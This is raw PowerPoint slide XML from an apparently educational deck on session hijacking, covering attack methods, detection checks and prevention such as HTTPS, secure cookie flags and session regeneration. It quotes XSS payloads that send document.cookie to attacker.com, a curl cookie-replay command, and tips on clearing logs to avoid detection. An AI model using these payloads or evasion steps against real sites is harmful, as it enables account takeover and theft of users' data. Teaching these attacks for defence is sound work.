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DM Sans" pitchFamily="2" charset="0"/>
      <p:regular r:id="rId19"/>
      <p:bold r:id="rId20"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="PT Serif" panose="020F0502020204030204" pitchFamily="18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3210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976" y="1099899"/>
            <a:ext cx="4289822" cy="536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Session Hijacking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571976" y="1683068"/>
            <a:ext cx="4085749" cy="42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Session Hijacking?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71976" y="2288500"/>
            <a:ext cx="8000048" cy="89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 hijacking (also called cookie hijacking) is the exploitation of a valid computer session to gain unauthorized access to information or services in a computer system. It specifically involves stealing or predicting a session token to impersonate a legitimate user and gain unauthorized access to the web server.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71976" y="3364706"/>
            <a:ext cx="3431858" cy="42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Work Flow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71976" y="3970139"/>
            <a:ext cx="8000048" cy="22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Normal Session Flow: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1976" y="4327446"/>
            <a:ext cx="8000048" cy="128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authenticates with username/password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 startAt="2"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Server creates a session and generates a unique </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="12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 ID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 startAt="3"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 ID is sent to client (usually as a cookie)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 startAt="4"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 includes session ID in subsequent requests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 startAt="5"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Server validates session ID to identify the user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71976" y="5749171"/>
            <a:ext cx="8000048" cy="22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 ID Storage Methods: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71976" y="6106478"/>
            <a:ext cx="8000048" cy="102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 cookies (most common)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URL parameters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Hidden form fields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 headers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2746" y="1034296"/>
            <a:ext cx="6952298" cy="59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Session Hijacking Attack Process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1012746" y="1927979"/>
            <a:ext cx="182642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12746" y="2215396"/>
            <a:ext cx="6228874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1012746" y="2352437"/>
            <a:ext cx="2397562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Target Identification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012746" y="2740343"/>
            <a:ext cx="6228874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attacker identifies a target user whose session they want to hijack.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12746" y="3092291"/>
            <a:ext cx="6228874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selection criteria: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12746" y="3444240"/>
            <a:ext cx="6228874" cy="89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High-value accounts (admin, financial, executive)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Active sessions on the network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on unsecured networks (public WiFi)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88662" y="1927979"/>
            <a:ext cx="182642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88662" y="2215396"/>
            <a:ext cx="6228993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7388662" y="2352437"/>
            <a:ext cx="2780467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Session Token Acquisition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388662" y="2740343"/>
            <a:ext cx="6228993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attacker obtains the victim's session token using various methods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2746" y="4622244"/>
            <a:ext cx="182642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12746" y="4909661"/>
            <a:ext cx="6228874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12746" y="5046702"/>
            <a:ext cx="3096101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Sequence Number Prediction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1012746" y="5434608"/>
            <a:ext cx="6228874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network-level session hijacking (TCP hijacking)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88662" y="4622244"/>
            <a:ext cx="182642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88662" y="4909661"/>
            <a:ext cx="6228993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9" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7388662" y="5046702"/>
            <a:ext cx="2397562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Session Replay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7388662" y="5434608"/>
            <a:ext cx="6228993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attacker uses the stolen session token to impersonate the victim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12746" y="5982295"/>
            <a:ext cx="182642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12746" y="6269712"/>
            <a:ext cx="6228874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3" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1012746" y="6406753"/>
            <a:ext cx="2397562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Exploitation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1012746" y="6794659"/>
            <a:ext cx="6228874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Once authenticated as the victim, perform malicious actions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88662" y="5982295"/>
            <a:ext cx="182642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88662" y="6269712"/>
            <a:ext cx="6228993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7" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7388662" y="6406753"/>
            <a:ext cx="2397562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Covering Tracks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7388662" y="6794659"/>
            <a:ext cx="6228993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 evidence and avoid detection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2878" y="1282779"/>
            <a:ext cx="5129927" cy="40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Session Token Acquisition Methods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022878" y="1718191"/>
            <a:ext cx="1964769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Method A: Session Sniffing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3022878" y="2024658"/>
            <a:ext cx="8584644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Attacker uses packet sniffer (Wireshark, tcpdump)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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="2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Captures network traffic on shared network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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="3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Extracts session ID from HTTP headers/cookies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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="4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Uses captured session ID to impersonate victim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022878" y="2789039"/>
            <a:ext cx="8584644" cy="154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 scenario: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022878" y="3019782"/>
            <a:ext cx="8584644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Victim connects to public WiFi at coffee shop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Attacker runs Wireshark on same network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Victim logs into banking website over HTTP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Attacker captures: Cookie: sessionid=abc123xyz789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22878" y="3846343"/>
            <a:ext cx="8584644" cy="23098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022878" y="3971687"/>
            <a:ext cx="2674382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Method B: Cross-Site Scripting (XSS)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22878" y="4278154"/>
            <a:ext cx="8584644" cy="154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attacker injects malicious JavaScript to steal cookies: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22878" y="4508897"/>
            <a:ext cx="8584644" cy="1264920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1475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3016687" y="4508897"/>
            <a:ext cx="8597027" cy="1264920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1475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3140988" y="4602123"/>
            <a:ext cx="8348424" cy="1078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Malicious script injected into vulnerable website</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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Steal session cookie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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var cookie = document.cookie;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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Send to attacker's server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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new Image().src = "http://attacker.com/steal.php?cookie=" + cookie;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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022878" y="5850493"/>
            <a:ext cx="8584644" cy="154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Attack flow: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22878" y="6081236"/>
            <a:ext cx="8584644" cy="865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Attacker finds XSS vulnerability in target website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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="2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Crafts malicious link with JavaScript payload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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="3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Victim clicks link (via phishing email/message)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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="4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JavaScript executes in victim's browser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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="5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Cookie sent to attacker's server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1369" y="1385649"/>
            <a:ext cx="2460188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Method C: Session Prediction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2381369" y="1710333"/>
            <a:ext cx="4759285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attacker predicts the session ID using available information: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381369" y="1977866"/>
            <a:ext cx="4759285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session IDs are predictable (e.g., sequential):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81369" y="2265640"/>
            <a:ext cx="4759285" cy="773668"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2773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2374225" y="2265640"/>
            <a:ext cx="4773573" cy="773668"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2773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2517219" y="2372797"/>
            <a:ext cx="4487585" cy="559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User 1: sessionid=1001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User 2: sessionid=1002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User 3: sessionid=1003 (attacker predicts this)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81369" y="3140631"/>
            <a:ext cx="4759285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Predictable patterns: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81369" y="3408164"/>
            <a:ext cx="4759285" cy="840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Sequential numbers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Timestamps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IP addresses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Weak random number generators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81369" y="4421419"/>
            <a:ext cx="4759285" cy="25479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381369" y="4548187"/>
            <a:ext cx="3240643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Method D: Man-in-the-Middle (MITM)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381369" y="4872871"/>
            <a:ext cx="4759285" cy="840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Attacker positions between victim and server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Intercepts all traffic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Captures session tokens in transit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also modify requests/responses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81369" y="5794415"/>
            <a:ext cx="4759285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Common MITM scenarios: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81369" y="6061948"/>
            <a:ext cx="4759285" cy="840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ARP spoofing on local network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Rogue WiFi access points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DNS spoofing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SSL stripping attacks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7128" y="1385649"/>
            <a:ext cx="3264694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Method E: Man-in-the-Browser (MITB)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497128" y="1710333"/>
            <a:ext cx="4759285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Malware installed on victim's computer intercepts browser communications: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7128" y="2164318"/>
            <a:ext cx="4759285" cy="840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Victim downloads trojan/malware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Malware hooks into browser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Captures session data directly from browser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Sends to attacker's command &amp; control server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7128" y="3177573"/>
            <a:ext cx="4759285" cy="25479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497128" y="3304342"/>
            <a:ext cx="4759285" cy="563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3: Sequence Number Prediction (for TCP hijacking)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497128" y="3957638"/>
            <a:ext cx="4759285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network-level session hijacking, the attacker must predict TCP sequence numbers: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7128" y="4411623"/>
            <a:ext cx="4759285" cy="840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 TCP connection between victim and server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sequence number patterns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 next sequence number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Inject packets with correct sequence number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7128" y="5333167"/>
            <a:ext cx="4759285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Failure consequence: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If sequence number is wrong, server sends reset packets and terminates the connection.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94303" y="1152763"/>
            <a:ext cx="4425196" cy="410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Session Replay &amp; Exploitation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994303" y="1736408"/>
            <a:ext cx="1972508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4: Session Replay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2994303" y="2052042"/>
            <a:ext cx="5062776" cy="155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attacker uses the stolen session token to impersonate the victim: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994303" y="2285286"/>
            <a:ext cx="5062776" cy="1431608"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1312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2988112" y="2285286"/>
            <a:ext cx="5075158" cy="1431608"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1312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3113246" y="2379107"/>
            <a:ext cx="4824889" cy="1243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Attacker modifies their browser cookie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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Original attacker cookie:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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Cookie: sessionid=attacker_session_123</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="9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Replace with victim's stolen cookie:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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Cookie: sessionid=abc123xyz789</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="9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Now attacker is authenticated as victim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94303" y="3794641"/>
            <a:ext cx="5062776" cy="155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Using curl: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94303" y="4027884"/>
            <a:ext cx="5062776" cy="343138"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5475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2988112" y="4027884"/>
            <a:ext cx="5075158" cy="343138"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5475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3113246" y="4121706"/>
            <a:ext cx="4824889" cy="155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curl -H "Cookie: sessionid=abc123xyz789" https://target.com/account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70213" y="1736408"/>
            <a:ext cx="1972508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5: Exploitation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370213" y="2052042"/>
            <a:ext cx="3273266" cy="155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Once authenticated as the victim, the attacker can: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354973" y="2270046"/>
            <a:ext cx="30480" cy="185976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8525828" y="2285286"/>
            <a:ext cx="3117652" cy="155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Access sensitive information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354973" y="2563773"/>
            <a:ext cx="30480" cy="185976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8525828" y="2579013"/>
            <a:ext cx="3117652" cy="155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Perform transactions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354973" y="2857500"/>
            <a:ext cx="30480" cy="185976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9" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8525828" y="2872740"/>
            <a:ext cx="3117652" cy="155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Change account settings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354973" y="3151227"/>
            <a:ext cx="30480" cy="185976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8525828" y="3166467"/>
            <a:ext cx="3117652" cy="155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Steal personal data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354973" y="3444954"/>
            <a:ext cx="30480" cy="185976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3" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8525828" y="3460194"/>
            <a:ext cx="3117652" cy="155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Commit fraud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354973" y="3738682"/>
            <a:ext cx="30480" cy="185976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5" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8525828" y="3753922"/>
            <a:ext cx="3117652" cy="155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Pivot to other systems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354973" y="4032409"/>
            <a:ext cx="30480" cy="185976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7" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8525828" y="4047649"/>
            <a:ext cx="3117652" cy="155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Maintain persistent access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994303" y="4589023"/>
            <a:ext cx="8641675" cy="23217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2994303" y="4715828"/>
            <a:ext cx="2052518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6: Covering Tracks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2994303" y="5066109"/>
            <a:ext cx="1080135" cy="455771"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4122"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EEEE"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3446264" y="5183862"/>
            <a:ext cx="176093" cy="220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199573" y="5191244"/>
            <a:ext cx="2900720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4. Use victim's typical behavior patterns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136946" y="5518071"/>
            <a:ext cx="7436525" cy="7620"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 246540"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D8D4D4"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2994303" y="5584388"/>
            <a:ext cx="2160389" cy="455771"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4122"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EEEE"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3986451" y="5702141"/>
            <a:ext cx="176093" cy="220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279827" y="5709523"/>
            <a:ext cx="3678198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3. Maintain session to prevent logout notifications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217200" y="6036350"/>
            <a:ext cx="6356271" cy="7620"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 246540"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D8D4D4"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Shape 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2994303" y="6102668"/>
            <a:ext cx="3240524" cy="455771"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4122"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2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4526518" y="6220420"/>
            <a:ext cx="176093" cy="220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359962" y="6227802"/>
            <a:ext cx="3407450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2. Avoid suspicious activities that trigger alerts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297335" y="6554629"/>
            <a:ext cx="5276136" cy="7620"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 246540"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D8D4D4"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Shape 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2994303" y="6620947"/>
            <a:ext cx="4320778" cy="455771"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4122"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EEEE"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5066586" y="6738699"/>
            <a:ext cx="176093" cy="220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440216" y="6746081"/>
            <a:ext cx="2279213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1. Clear access logs (if possible)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0436" y="1035248"/>
            <a:ext cx="5592247" cy="590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Types of Session Hijacking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30436" y="1840706"/>
            <a:ext cx="7883128" cy="999768"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2703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810458" y="2020729"/>
            <a:ext cx="2797373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1. Active Session Hijacking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10458" y="2401967"/>
            <a:ext cx="7523083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Attacker takes over an active session and uses it immediately.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0436" y="2983468"/>
            <a:ext cx="7883128" cy="999768"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2703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810458" y="3163491"/>
            <a:ext cx="2915960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2. Passive Session Hijacking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10458" y="3544729"/>
            <a:ext cx="7523083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Attacker monitors session without interfering, collecting information.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436" y="4126230"/>
            <a:ext cx="7883128" cy="1925241"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1403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810458" y="4306253"/>
            <a:ext cx="2364105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3. Session Fixation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10458" y="4687491"/>
            <a:ext cx="7523083" cy="1183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Attacker creates session ID on target website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Tricks victim into using that session ID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Victim authenticates using attacker's session ID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Attacker now has authenticated session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0436" y="6194465"/>
            <a:ext cx="7883128" cy="999768"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2703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810458" y="6374487"/>
            <a:ext cx="2364105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4. Session Sidejacking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10458" y="6755725"/>
            <a:ext cx="7523083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Specifically targets unencrypted session cookies on public WiFi networks.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31569" y="1236583"/>
            <a:ext cx="4095631" cy="407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Real-World Attack Examples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031569" y="1671042"/>
            <a:ext cx="2457450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Example 1: Firesheep (2010)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031569" y="2017276"/>
            <a:ext cx="8567261" cy="153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Firefox extension that automated session hijacking on public WiFi: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031569" y="2247424"/>
            <a:ext cx="8567261" cy="863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installs Firesheep on laptop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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="2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Connects to public WiFi (Starbucks, airport)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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="3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Firesheep captures all HTTP cookies on network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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="4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Displays list of logged-in users with their profiles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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="5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One-click hijacking of any session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031569" y="3187184"/>
            <a:ext cx="8567261" cy="153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Impact:</a:t>
            </a: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Demonstrated how easy session hijacking was, forcing many websites to adopt HTTPS.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31569" y="3479329"/>
            <a:ext cx="8567261" cy="23098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031569" y="3604260"/>
            <a:ext cx="2516148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Example 2: XSS Cookie Theft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031569" y="3950494"/>
            <a:ext cx="8567261" cy="1569601"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1187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3025378" y="3950494"/>
            <a:ext cx="8579644" cy="1569601"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1187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3149441" y="4043601"/>
            <a:ext cx="8331518" cy="138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Vulnerable website search function</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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https://vulnerable-site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="9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Attacker's malicious payload</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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https://vulnerable-site.com/search?q=&lt;script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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fetch('https://attacker.com/log?c=' + document.cookie)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="9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Victim clicks link, cookie stolen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31569" y="5658530"/>
            <a:ext cx="8567261" cy="23098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031569" y="5783461"/>
            <a:ext cx="29384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Example 3: WiFi Pineapple Attack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31569" y="6129695"/>
            <a:ext cx="8567261" cy="863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Attacker sets up rogue WiFi access point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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="2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Names it "Free_Airport_WiFi"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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="3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Victims connect automatically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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="4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traffic routes through attacker's device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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="5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 cookies captured in plaintext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101167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Detection Methods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402449" y="1406366"/>
            <a:ext cx="1488519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Server-Side Detection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3402449" y="1677353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 for anomalies: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02449" y="1877139"/>
            <a:ext cx="7825502" cy="915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IP address changes mid-session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Geolocation changes (user in US, then China)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User-agent string changes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Multiple concurrent sessions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Unusual access patterns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Rapid requests from same session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02449" y="2856190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Implementation example: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402449" y="3055977"/>
            <a:ext cx="7825502" cy="2075259"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 820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3396853" y="3055977"/>
            <a:ext cx="7836694" cy="2075259"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 820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3510201" y="3140988"/>
            <a:ext cx="7609999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detect_session_hijacking(session_id, request):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 = get_session(session_id)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# Check IP address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session.ip_address != request.ip_address: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flag_suspicious(session_id, "IP change")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# Check user agent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session.user_agent != request.user_agent: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flag_suspicious(session_id, "User-agent change")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# Check geolocation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distance(session.location, request.location) &gt; 500: # km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flag_suspicious(session_id, "Impossible travel")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02449" y="5216247"/>
            <a:ext cx="1488519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Client-Side Detection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02449" y="5487233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Browser fingerprinting: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02449" y="5687020"/>
            <a:ext cx="7825502" cy="1530906"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2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396853" y="5687020"/>
            <a:ext cx="7836694" cy="1530906"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1111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3510201" y="5772031"/>
            <a:ext cx="7609999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Collect browser characteristics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 fingerprint =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screen: screen.width + "x" + screen.height,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timezone: new Date().getTimezoneOffset(),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language: navigator.language,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plugins: navigator.plugins.length,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canvas: getCanvasFingerprint()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Send with each request for validation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975122"/>
            <a:ext cx="371332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Core Prevention Techniques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402449" y="1630561"/>
            <a:ext cx="3884414" cy="2660094"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 275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402449" y="1615321"/>
            <a:ext cx="3884414" cy="6096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5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5174516" y="1460540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5276552" y="1545550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531037" y="1914049"/>
            <a:ext cx="1547693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 HTTPS Everywhere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531037" y="2133957"/>
            <a:ext cx="362723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Force HTTPS in Apache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531037" y="2333744"/>
            <a:ext cx="3627239" cy="714375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3525441" y="2333744"/>
            <a:ext cx="3638431" cy="714375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3638788" y="2418755"/>
            <a:ext cx="3411736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RewriteEngine On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RewriteCond %{HTTPS} off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RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]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43537" y="1630561"/>
            <a:ext cx="3884414" cy="2660094"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 275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343537" y="1615321"/>
            <a:ext cx="3884414" cy="6096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9115604" y="1460540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9217640" y="1545550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72124" y="1914049"/>
            <a:ext cx="2646283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Implement Secure Session Management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472124" y="2133957"/>
            <a:ext cx="362723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 cryptographically secure session IDs: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472124" y="2333744"/>
            <a:ext cx="3627239" cy="578287"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2942"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7466528" y="2333744"/>
            <a:ext cx="3638431" cy="578287"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2942"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2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7579876" y="2418755"/>
            <a:ext cx="3411736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secrets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32-byte random session ID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 = secrets.token_urlsafe(32)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472124" y="2975729"/>
            <a:ext cx="362723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secure cookie attributes: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72124" y="3175516"/>
            <a:ext cx="3627239" cy="986552"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1724"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7466528" y="3175516"/>
            <a:ext cx="3638431" cy="986552"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1724"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7579876" y="3260527"/>
            <a:ext cx="3411736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Set-Cookie: sessionid=abc123;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Secure;        # Only sent over HTTPS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HttpOnly;      # Not accessible via JavaScript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SameSite=Strict; # Prevents CSRF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Path=/;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Max-Age=3600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02449" y="4517350"/>
            <a:ext cx="3884414" cy="2737009"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2673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402449" y="4502110"/>
            <a:ext cx="3884414" cy="6096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27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5174516" y="4347329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E04F00"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5276552" y="4432340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531037" y="4800838"/>
            <a:ext cx="1488519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Session Regeneration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531037" y="5050512"/>
            <a:ext cx="3627239" cy="2075259"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 820"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3525441" y="5050512"/>
            <a:ext cx="3638431" cy="2075259"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 820"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3638788" y="5135523"/>
            <a:ext cx="3411736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Regenerate session ID after login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login(username, password):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if authenticate(username, password):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old_session_id = get_current_session_id()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new_session_id = generate_new_session_id()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# Copy session data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copy_session_data(old_session_id, new_session_id)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# Destroy old session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destroy_session(old_session_id)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# Return new session ID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return new_session_id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43537" y="4517350"/>
